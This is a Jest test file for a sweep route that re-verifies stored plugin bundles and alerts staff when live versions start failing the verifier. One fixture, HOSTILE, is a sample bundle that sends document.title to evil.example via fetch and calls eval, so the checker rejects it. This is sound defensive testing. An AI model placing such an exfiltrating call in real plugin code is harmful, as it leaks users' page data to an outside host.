/**
 * @jest-environment node
 */

/**
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Drives the REAL sweep handler (AGL-1086) with Firestore and Storage
 * faked, because the branch worth testing has never run in the wild: the
 * production sweep found zero regressions, which means the notification and
 * the audit write — the whole reason the sweep exists — have never actually
 * fired. `regressionNeedsStaff` is unit-tested beside them, but a decision
 * nothing calls is the failure mode that keeps recurring here (a control
 * that is correct, configured and has no callers).
 *
 * So: real auth check, real request parsing, real `checkPluginBundle` over
 * real bundle bytes. Only the I/O is fake.
 *
 * ⚑ The stored versions arrive through `core.plugin-artifact-inventory`
 * since AGL-3080, so this file stands one up rather than faking a collection
 * group. The REGISTRAR is the real one — an app spec may not import a plugin
 * at all (AGL-2282), and the thing worth proving here is the route's half:
 * that it refuses when the inventory does, and judges the rows when it does
 * not.
 */

import { PLUGIN_VERIFIER_VERSION } from '@aglyn/aglyn/server'
import { registerPluginArtifactInventory } from '@aglyn/aglyn/plugin-manager/plugin-artifact-inventory'

const mockNotifyStaff = jest.fn(async (_payload: unknown) => undefined)
const mockAuditAdd = jest.fn(async (_entry: unknown) => undefined)
const mockVersionSet = jest.fn(
  async (_data: unknown, _options?: unknown) => undefined,
)
const mockDownload = jest.fn()

/** A bundle that fails the CURRENT checker: undeclared network + eval. */
const HOSTILE = `export function register() {
  fetch('https://evil.example', { body: document.title })
  return eval('1')
}
`
/** A bundle that passes it. */
const CLEAN = `export function register(host) { return host }\n`

interface VersionSeed {
  storedOk?: boolean
  storedVerifierVersion?: number
  activeInstalls?: number
  reviewStatus?: string
  network?: string[]
}

let mockSeed: VersionSeed = {}

/** Whether the stand-in inventory answers rows or refuses, and why. */
let mockRefusal: string | null = null

/** The one stored version every case below is written against. */
const standInVersion = () => ({
  listingId: 'listing-1',
  version: '1.0.0',
  sha256: 'a'.repeat(64),
  ownerLive: true,
  ownerName: 'Smoke Test Widget',
  reviewStatus: mockSeed.reviewStatus ?? 'verified',
  activeInstalls: mockSeed.activeInstalls ?? 0,
  reviewLink: '/admin/plugin-reviews/listing-1?version=1.0.0',
  storedVerdict:
    mockSeed.storedOk === undefined
      ? undefined
      : {
          ok: mockSeed.storedOk,
          sha256: 'a'.repeat(64),
          verifierVersion: mockSeed.storedVerifierVersion ?? 1,
        },
  declaredNetwork: mockSeed.network ?? [],
  declaredContributions: null,
  record: mockVersionSet,
})

// The loader is a no-op here: what it would load is the plugin registered
// below, and an app spec may not import one.
jest.mock('../../../../utils/server-plugin-loader', () => ({
  serverPluginLoader: { ensureAll: async () => undefined },
}))

jest.mock('@aglyn/tenant-data-admin', () => ({
  notifyStaff: (payload: unknown) => mockNotifyStaff(payload),
  firebaseAdmin: {
    app: () => ({
      firestore: () => ({
        collection: (name: string) =>
          name === 'adminAudit'
            ? { add: mockAuditAdd }
            : { doc: (id: string) => ({ id }) },
      }),
      storage: () => ({
        bucket: () => ({ file: () => ({ download: mockDownload }) }),
      }),
    }),
  },
}))

jest.mock('firebase-admin/firestore', () => ({
  FieldValue: { serverTimestamp: () => 'ts' },
}))

const post = async (body: Record<string, unknown> = {}) => {
  const { POST } = await import('./route')
  const response = await POST(
    new Request('https://console.test/api/admin/reverify-plugin-versions', {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'x-cron-secret': 'test-secret',
      },
      body: JSON.stringify(body),
    }),
  )
  return { status: response.status, payload: await response.json() }
}

describe('the plugin-verdict sweep (AGL-1086)', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    process.env.CRON_SECRET = 'test-secret'
    process.env.PLUGIN_ARTIFACTS_BUCKET = 'artifacts-test'
    mockSeed = {}
    mockRefusal = null
    mockDownload.mockResolvedValue([Buffer.from(CLEAN, 'utf8')])
    registerPluginArtifactInventory(
      {
        listClaims: async () => ({
          outcome: 'listed' as const,
          rows: [standInVersion()],
          scanned: 1,
        }),
        listVersions: async () =>
          mockRefusal
            ? { outcome: 'refused' as const, reason: mockRefusal, scanned: 7 }
            : {
                outcome: 'listed' as const,
                rows: [standInVersion()],
                scanned: 1,
              },
      },
      // Named, because this stands in for a plugin and the registry refuses
      // an ownerless service — the same guard that stops one plugin's
      // registration answering under another's name.
      { pluginId: 'stand-in-marketplace' },
    )
  })

  it('REFUSES the sweep when the inventory cannot be trusted', async () => {
    /*
     * The reassuring failure, refused. A sweep that reported "nothing
     * regressed" having read none of the platform is indistinguishable, in
     * the report staff read, from a platform where nothing regressed — and
     * this report is the only thing that says a live version started
     * failing.
     */
    mockRefusal = 'more than 100000 stored plugin version claims'
    const { status, payload } = await post()
    expect(status).toBe(507)
    expect(payload.error).toContain('100000')
    expect(payload.scanned).toBe(7)
    expect(mockDownload).not.toHaveBeenCalled()
    expect(mockNotifyStaff).not.toHaveBeenCalled()
  })

  it('refuses an unauthenticated caller before touching anything', async () => {
    const { POST } = await import('./route')
    const response = await POST(
      new Request('https://console.test/api/admin/reverify-plugin-versions', {
        method: 'POST',
        headers: { 'x-cron-secret': 'wrong' },
      }),
    )
    expect(response.status).toBe(401)
    expect(mockDownload).not.toHaveBeenCalled()
  })

  it('skips a verdict that is already current, without downloading', async () => {
    mockSeed = { storedOk: true, storedVerifierVersion: PLUGIN_VERIFIER_VERSION }
    const { payload } = await post()
    expect(payload.skipped).toBe(1)
    expect(payload.downloaded).toBe(0)
    expect(mockDownload).not.toHaveBeenCalled()
  })

  it('re-checks a stale verdict and writes the new one back', async () => {
    mockSeed = { storedOk: true, storedVerifierVersion: 1 }
    const { payload } = await post()
    expect(payload.downloaded).toBe(1)
    expect(payload.unchanged).toBe(1)
    expect(mockVersionSet).toHaveBeenCalledTimes(1)
    // The VERDICT, handed to the row that was read (AGL-3080). The document
    // shape around it — the `verification` field, the timestamp — is the
    // owning plugin's to write, and asserting it here would be this route
    // asserting a document it no longer touches.
    const written = mockVersionSet.mock.calls[0][0] as {
      verifierVersion: number
      checks: unknown[]
      sha256: string
    }
    expect(written.verifierVersion).toBe(PLUGIN_VERIFIER_VERSION)
    expect(written.checks.length).toBeGreaterThan(0)
    expect(written.sha256).toBe('a'.repeat(64))
  })

  it('NOTIFIES staff and audits when live installed bytes regress', async () => {
    // The branch that has never fired in production.
    mockSeed = {
      storedOk: true,
      storedVerifierVersion: 1,
      reviewStatus: 'verified',
      activeInstalls: 3,
    }
    mockDownload.mockResolvedValue([Buffer.from(HOSTILE, 'utf8')])

    const { payload } = await post()

    expect(payload.regressed).toBe(1)
    expect(payload.needsStaff).toHaveLength(1)
    expect(mockNotifyStaff).toHaveBeenCalledTimes(1)
    const notification = mockNotifyStaff.mock.calls[0][0] as Record<string, string>
    expect(notification.type).toBe('system.pluginVerifierRegression')
    expect(notification.title).toContain('fail the verifier')
    expect(notification.link).toContain('/admin/plugin-reviews/listing-1')
    expect(notification.link).toContain('version=1.0.0')
    expect(mockAuditAdd).toHaveBeenCalledTimes(1)
    const audit = mockAuditAdd.mock.calls[0][0] as { action: string }
    expect(audit.action).toBe('plugins.verifier.regression')
  })

  it('stays quiet when the regressed version is not live', async () => {
    mockSeed = {
      storedOk: true,
      storedVerifierVersion: 1,
      reviewStatus: 'rejected',
      activeInstalls: 3,
    }
    mockDownload.mockResolvedValue([Buffer.from(HOSTILE, 'utf8')])
    const { payload } = await post()
    expect(payload.regressed).toBe(1)
    expect(mockNotifyStaff).not.toHaveBeenCalled()
    expect(mockAuditAdd).not.toHaveBeenCalled()
  })

  it('does not call a first-time failure a regression', async () => {
    mockSeed = { reviewStatus: 'verified', activeInstalls: 3 }
    mockDownload.mockResolvedValue([Buffer.from(HOSTILE, 'utf8')])
    const { payload } = await post()
    expect(payload.regressed).toBe(0)
    expect(payload.stillFailing).toBe(1)
    expect(mockNotifyStaff).not.toHaveBeenCalled()
  })

  it('writes nothing and notifies nobody on a dry run', async () => {
    mockSeed = {
      storedOk: true,
      storedVerifierVersion: 1,
      reviewStatus: 'verified',
      activeInstalls: 3,
    }
    mockDownload.mockResolvedValue([Buffer.from(HOSTILE, 'utf8')])
    const { payload } = await post({ dryRun: true })
    expect(payload.regressed).toBe(1)
    expect(mockVersionSet).not.toHaveBeenCalled()
    expect(mockNotifyStaff).not.toHaveBeenCalled()
  })

  it('reports an unreadable artifact rather than assuming it is clean', async () => {
    mockSeed = { storedOk: true, storedVerifierVersion: 1 }
    mockDownload.mockRejectedValue(new Error('404'))
    const { payload } = await post()
    expect(payload.unverifiable).toBe(1)
    expect(mockVersionSet).not.toHaveBeenCalled()
    // In WORDS, and naming storage (AGL-1094): "unverifiable" with an empty
    // problem list read as a missing artifact even when the checker was the
    // thing that broke, and sent an investigation at the wrong subsystem.
    expect(payload.notable[0].problems[0]).toContain('could not be downloaded')
  })

  it('a checker failure is a verdict, not a missing artifact (AGL-1094)', async () => {
    // checkPluginBundle cannot throw any more, so a bundle it chokes on comes
    // back as a real verdict carrying the reason — never as `unverifiable`,
    // which belongs to storage alone.
    mockSeed = { storedOk: true, storedVerifierVersion: 1 }
    mockDownload.mockResolvedValue([
      Buffer.from(
        `const ICON = 'data:image/svg+xml,<svg/>'\n` +
          `export function register(host) { host.setIcon(ICON) }\n`,
        'utf8',
      ),
    ])
    const { payload } = await post()
    expect(payload.unverifiable).toBe(0)
    expect(payload.unchanged).toBe(1)
  })
})
